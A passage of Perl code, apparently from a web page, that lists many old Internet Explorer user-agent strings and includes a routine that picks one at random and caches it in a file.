	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 3.0.04506.30)",
	"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.0; FBSMTWB; .NET CLR 2.0.34861; .NET CLR 3.0.3746.3218; .NET CLR 3.5.33652; msn OptimizedIE8;ENUS)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 3.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; msn OptimizedIE8;ZHCN)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; InfoPath.3; .NET4.0C; .NET4.0E) chromeframe/8.0.552.224)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; Zune 4.7; InfoPath.3)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; Zune 4.7)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; Zune 4.0)",
	"Mozilla/4.0(compatible; MSIE 7.0b; Windows NT 6.0)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; Media Center PC 3.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; FDM; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.40607)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.0.3705; Media Center PC 3.1; Alexa Toolbar; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)",
	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)",
	"Mozilla/5.0 (MSIE 7.0; Macintosh; U; SunOS; X11; gu; SV1; InfoPath.2; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
	"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)",
	"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)",
	"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; fr-FR)",
	"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US)",
	"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (compatible; MSIE 7.0; Windows 98; SpamBlockerUtility 6.3.91; SpamBlockerUtility 6.2.91; .NET CLR 4.1.89;GB)",
	"Mozilla/4.79 [en] (compatible; MSIE 7.0; Windows NT 5.0; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
	"Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)",
	"Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)",
	"Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.0)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
	"Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1; DigExt)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.2.6)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.0.0) (Compatible; ; ; Trident/4.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.0.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0; .NET CLR 1.0.2914)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98; YComp 5.0.0.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98; Win 9x 4.90)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.0.3705)",
	"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0)",
	"Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4325)",
	"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/45.0 (compatible; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/4.08 (compatible; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/4.01 (compatible; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/4.0 (X11; MSIE 6.0; i686; .NET CLR 1.1.4322; .NET CLR 2.0.50727; FDM)",
	"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)",
	"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2)",
	"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.0)",
	"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (MSIE 6.0; Windows NT 5.1)",
	"Mozilla/4.0 (MSIE 6.0; Windows NT 5.0)",
	"Mozilla/4.0 (compatible;MSIE 6.0;Windows 98;Q312461)",
	"Mozilla/4.0 (Compatible; Windows NT 5.1; MSIE 6.0) (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1) (Compatible; ; ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3; Tablet PC 2.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB6.5; QQDownload 534; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.9; SiteCoach 1.0)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8; SiteCoach 1.0)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8)",
	"Mozilla/4.0 (compatible; MSIE 5.50; Windows 98; SiteKiosk 4.8)",
	"Mozilla/4.0 (compatible;MSIE 5.5; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 5.5;)",
	"Mozilla/4.0 (Compatible; MSIE 5.5; Windows NT5.0; Q312461; SV1; .NET CLR 1.1.4322; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT5)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; chromeframe/12.0.742.100; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.5)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; FDM)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322) (Compatible; ; ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
	);

	if (open(FILE, "<".$uafile)){
		$ua = <FILE>;
		close(FILE);
	}
	else {
	# ">" - запись,"<"- чтение, ">>"- добавление в файл.
		if (open(FILE, ">".$uafile)){
			my $i = int (rand(scalar @uaList));

			print "getUA: len = ".(scalar @uaList)." i = $i\n";
			$ua = $uaList[$i];

			print "getUA: ua = $ua\n";

			printf FILE $ua;
			close FILE;
		}
		else {
			print "Error working with ".$uafile."\n";
			exit;
		}
	}
}</code></pre>
